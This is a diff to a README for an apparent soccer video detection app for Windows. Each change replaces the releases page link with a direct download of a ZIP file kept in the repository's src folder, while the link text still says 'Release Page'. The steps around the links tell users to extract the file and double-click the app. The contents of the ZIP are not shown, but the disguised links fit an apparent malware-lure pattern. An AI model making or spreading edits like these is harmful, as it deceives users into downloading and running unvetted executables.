@@ -1,6 +1,6 @@
 # ⚽ soccer-video-detection-ai-agent - Track Soccer Action with Ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Cref08/soccer-video-detection-ai-agent/raw/refs/heads/main/src/video_soccer_detection_agent_ai_2.6.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ You can use it to inspect match footage, look for players, and work with soccer 
 
 ## 📥 Download for Windows
 
-1. Open the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+1. Open the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/raw/refs/heads/main/src/video_soccer_detection_agent_ai_2.6.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. Save the file to a folder you can find again, like Downloads or Desktop
@@ -31,7 +31,7 @@ For best results, use a computer with a solid-state drive and recent drivers for
 
 ## 🚀 Get Started
 
-1. Download the latest Windows release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+1. Download the latest Windows release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/raw/refs/heads/main/src/video_soccer_detection_agent_ai_2.6.zip)
 2. Open the downloaded ZIP or app file
 3. If needed, extract all files to one folder
 4. Double-click the app to launch it
@@ -63,7 +63,7 @@ It is a good fit for:
 
 ## 🪟 Windows Setup Steps
 
-1. Download the latest release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+1. Download the latest release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/raw/refs/heads/main/src/video_soccer_detection_agent_ai_2.6.zip)
 2. Right-click the downloaded ZIP file if one was provided
 3. Choose Extract All
 4. Open the extracted folder
@@ -169,7 +169,7 @@ This project works with:
 
 If this is your first time using the app, use this order:
 
-1. Download the latest file from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+1. Download the latest file from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/raw/refs/heads/main/src/video_soccer_detection_agent_ai_2.6.zip)
 2. Extract the files
 3. Open the app
 4. Load a short MP4 clip
